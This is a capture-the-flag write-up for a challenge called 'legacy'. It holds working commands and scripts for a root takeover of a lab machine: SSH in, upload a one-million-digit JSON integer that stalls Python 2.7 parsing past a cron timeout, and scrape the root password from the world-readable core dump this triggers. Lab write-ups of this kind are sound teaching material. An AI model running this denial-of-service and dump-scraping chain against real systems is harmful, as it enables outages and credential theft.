# legacy

## Summary

The foothold is an SSH account with access to a note-taking service bound only to localhost. The service lets us add a JSON note, while a root cron job later parses every note with Python 2.7. An integer containing one million digits makes Python 2 spend longer than the cron timeout in `json.loads`; the timeout sends `SIGQUIT`, and the backup script responds by creating a world-readable core dump. The root password is still present in that dump, so it can be recovered and used to read `/root/flag.txt`.

## Solution

### Step 1: Reach the internal service

The challenge supplies the low-privilege SSH credentials:

```text
username: sys4dmin
password: adminpass
```

Connect to the deployment using the SSH port supplied by the challenge instance:

```bash
ssh -p 31522 sys4dmin@136.92.7.211
```

After logging in, the note application is reachable from the target itself:

```bash
curl -i http://127.0.0.1:8080/
```

The service returns an `mdsession` cookie. The upload endpoint accepts JSON notes, so the SSH session can be used as a tunnel to the otherwise-internal application.

### Step 2: Identify the timeout and memory-dump behavior

The important scheduled command is:

```text
/usr/bin/timeout --signal=QUIT --kill-after=5s 10s /var/run/s3cr3t_py_d1r/backup.sh
```

The backup script starts a Python 2.7 process as root. That process loads `ROOT_PASSWORD` from `/root/.env` and calls `json.loads()` for each JSON note in `/app/notes`.

Python 2.7 has no maximum length for a decimal integer literal. Converting a very long decimal string to an integer is quadratic in its length. Therefore a note such as the following is valid JSON but deliberately expensive to parse:

```json
{"note": 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999}
```

The solver uploads the same structure with one million `9` characters. When the next backup run reads it, parsing takes longer than ten seconds. `timeout` then sends `SIGQUIT` to the backup script. Its signal handler runs `gcore` on the Python process, moves the result to `/tmp/memdump_<pid>.core`, and changes its mode to `0644`.

This turns a denial-of-service condition into a credential disclosure: the dump contains the environment string `ROOT_PASSWORD=<value>` and is readable by `sys4dmin`.

### Step 3: Extract the password and read the flag

The manual sequence after obtaining the cookie is:

```bash
python3 - <<'PY'
from pathlib import Path
Path('/tmp/note.json').write_bytes(b'{"note": ' + b'9' * 1_000_000 + b'}')
PY
curl -sS -H 'Cookie: mdsession=<cookie>' \
     -H 'Content-Type: application/json' \
     --data-binary @/tmp/note.json \
     http://127.0.0.1:8080/upload
rm -f /tmp/note.json
find /tmp -maxdepth 1 -name 'memdump_*.core' -ls
```

The `find` command is repeated until a new dump appears. The password can then be recovered from that dump with:

```bash
python3 - <<'PY'
import pathlib
import re

for path in pathlib.Path('/tmp').glob('memdump_*.core'):
    data = path.read_bytes()
    match = re.search(rb'ROOT_PASSWORD=([^\x00\r\n\t ]{1,128})', data)
    if match:
        print(match.group(1).decode())
        break
PY
```

Finally, use the printed value for the root SSH login and read the flag:

```bash
ssh -p 31522 root@136.92.7.211
cat /root/flag.txt
```

The complete solver in [solve.py](./solve.py) performs the whole chain:

1. SSH to the target as `sys4dmin`.
2. Fetch an `mdsession` cookie from `127.0.0.1:8080`.
3. Upload a one-million-digit JSON integer.
4. Wait for a new `/tmp/memdump_*.core` file.
5. Read the dump over SFTP and extract `ROOT_PASSWORD=`.
6. SSH again as `root` and read `/root/flag.txt`.

Run it with the recorded deployment target or provide another host and port:

```bash
python3 solve.py
python3 solve.py <host> --port <ssh-port>
```

The successful run produced:

## Flag

```text
CTF{L3g4cy_Syst3ms_H4v3_Fun_Att4cks_D0s_on_python2}
```
